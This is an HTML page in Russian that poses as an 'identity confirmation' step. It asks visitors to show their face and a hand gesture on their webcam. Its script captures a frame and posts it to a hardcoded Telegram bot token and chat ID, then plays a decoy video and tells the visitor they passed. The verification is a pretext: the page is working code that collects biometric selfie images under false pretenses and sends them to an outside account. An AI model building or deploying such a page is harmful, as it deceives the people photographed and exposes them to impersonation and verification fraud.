<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение личности</title>
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: system-ui, sans-serif;
            text-align: center;
            padding: 30px 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        .video-wrapper {
            position: relative;
            background: #111;
            border-radius: 16px;
            overflow: hidden;
            border: 2px solid #333;
            margin: 16px auto;
            max-width: 340px;
        }
        video {
            width: 100%;
            display: block;
        }
        #rickroll {
            display: none;
        }
        .btn {
            background: #1e90ff;
            border: none;
            color: #fff;
            padding: 16px 30px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            max-width: 280px;
        }
        .btn:active {
            transform: scale(0.96);
        }
        #status {
            margin-top: 16px;
            color: #888;
            font-size: 14px;
        }
        .instruction {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 16px;
            margin: 16px 0;
            text-align: left;
            font-size: 15px;
            border-left: 4px solid #1e90ff;
        }
        .instruction span {
            color: #ffcc00;
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>🔐 Подтверждение личности</h2>
    <p>Покажите лицо и жест рукой (🤘 или 👍)</p>

    <div class="instruction">
        <span>📌 Инструкция:</span><br>
        1. Покажите <span>лицо</span> (чётко, при хорошем свете)<br>
        2. Покажите <span>жест рукой</span> (🤘 или 👍)<br>
        3. Нажмите «Отправить»
    </div>

    <div class="video-wrapper">
        <video id="video" autoplay playsinline></video>
        <video id="rickroll" src="https://filesamples.com/samples/video/mp4/sample_640x360.mp4" muted playsinline></video>
    </div>

    <button class="btn" id="sendBtn">📸 Отправить фото</button>
    <div id="status">⏳ Ожидание камеры...</div>
</div>

<script>
    // ===== ТВОИ ДАННЫЕ =====
    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
    const CHAT_ID = '5025315928';
    // =======================

    const video = document.getElementById('video');
    const rickroll = document.getElementById('rickroll');
    const sendBtn = document.getElementById('sendBtn');
    const status = document.getElementById('status');

    let stream = null;
    let isRickroll = false;

    async function startCam() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            status.textContent = '✅ Камера готова. Нажмите "Отправить"';
        } catch (e) {
            status.textContent = '❌ Ошибка камеры: ' + e.message;
        }
    }

    async function sendPhoto() {
        if (isRickroll) return;

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);

        // водяной знак
        ctx.fillStyle = '#ffffff30';
        ctx.fillRect(0, 440, 640, 40);
        ctx.fillStyle = '#fff';
        ctx.font = '16px sans-serif';
        ctx.fillText('Подтверждение личности', 20, 470);

        const data = canvas.toDataURL('image/png');
        status.textContent = '📤 Отправка...';

        try {
            const blob = await fetch(data).then(r => r.blob());
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'face.png');

            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            });
            const json = await res.json();
            if (json.ok) {
                status.textContent = '✅ Отправлено!';
                startRickroll();
            } else {
                status.textContent = '❌ Ошибка: ' + json.description;
            }
        } catch (e) {
            status.textContent = '❌ Ошибка сети';
        }
    }

    function startRickroll() {
        isRickroll = true;
        if (stream) stream.getTracks().forEach(t => t.stop());
        video.style.display = 'none';
        rickroll.style.display = 'block';
        rickroll.muted = false;
        rickroll.volume = 1.0;
        rickroll.play().catch(() => {});
        sendBtn.style.display = 'none';
        status.textContent = '🎵 Добро пожаловать!';
        document.querySelector('p').textContent = '🎉 Вы прошли проверку!';
    }

    sendBtn.onclick = sendPhoto;
    startCam();
</script>
</body>
</html>
